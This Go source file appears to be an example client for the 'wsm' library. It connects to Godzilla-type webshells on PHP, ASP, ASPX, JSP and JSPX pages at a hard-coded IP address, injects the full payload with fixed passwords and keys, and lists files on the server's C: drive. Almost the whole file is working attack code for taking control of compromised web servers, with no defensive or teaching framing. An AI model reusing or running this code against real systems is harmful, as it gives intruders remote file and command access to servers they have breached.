package main

import (
	"fmt"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/charset"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/godzilla"
	"log"
)

const (
	AspRawShellUrl   = "http://139.196.175.86:8081/xorraw.asp"
	AspBs64ShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
	AspxBs64ShellUrl = "http://139.196.175.86:8081/bs64.aspx"
	AspxRawShellUrl  = "http://139.196.175.86:8081/raw.aspx"
	JspBs64ShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
	JspRawShellUrl   = "http://139.196.175.86:8080/raw.jsp"
	JspxBs64ShellUrl = "http://139.196.175.86:8080/bs64.jspx"
	JspxRawShellUrl  = "http://139.196.175.86:8080/raw.jspx"
	PhpBs64ShellUrl  = "http://139.196.175.86/bs64.php"
	PhpRawShellUrl   = "http://139.196.175.86/raw.php"
)

func main() {
	jspBs64Exec()
	jspRawExec()

	jspxBs64Exec()
	jspxRawExec()

	aspxBs64Exec()
	aspxRawExec()

	aspBs64Exec()
	aspRawExec()

	phpBs64Exec()
	phpRawExec()
}

func phpRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpRawShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func phpBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpBs64ShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func aspRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspRawShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func aspBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspBs64ShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func aspxRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxRawShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func aspxBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func jspxRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func jspxBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func jspRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}

func jspBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	// 注入全部的 payload
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())
}
